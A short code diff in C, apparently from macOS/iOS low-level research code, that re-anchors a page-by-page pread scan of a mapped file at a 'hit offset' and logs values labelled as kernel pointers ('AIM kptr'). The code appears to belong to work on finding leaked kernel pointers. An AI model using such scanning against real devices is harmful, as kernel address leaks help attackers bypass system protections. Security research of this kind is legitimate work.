@@ -536,10 +536,12 @@ static CFNumberRef RCNUM(int64_t v) {
                            (unsigned long long)kn, kn ? "  <-- POINTERS" : "");
                     for (int ki = 0; ki < kn; ki++)
                         rc_log("  AIM kptr[%d]=0x%016llx", ki, (unsigned long long)kptrs[ki]);
-                    /* the +/-4-page walk in THIS map */
+                    /* the +/-4-page walk anchored at the HIT OFFSET (the
+                       v11 unified law from the main copy — the old fixed
+                       0x4000 anchor walked the wrong window) */
                     for (int st = 1; st <= 4 && kn == 0; st++) {
                         uint8_t wb[sizeof(rbBuf)];
-                        ssize_t wn = pread(fdMark, wb, sizeof(wb), 0x4000 + (off_t)st * (off_t)vm_page_size);
+                        ssize_t wn = pread(fdMark, wb, sizeof(wb), (off_t)off + 0x4000 + (off_t)st * (off_t)vm_page_size);
                         if (wn < 8) break;
                         uint64_t *wq8 = (uint64_t *)wb;
                         int wkn = 0, wcont = 0; uint64_t wfirst = 0;
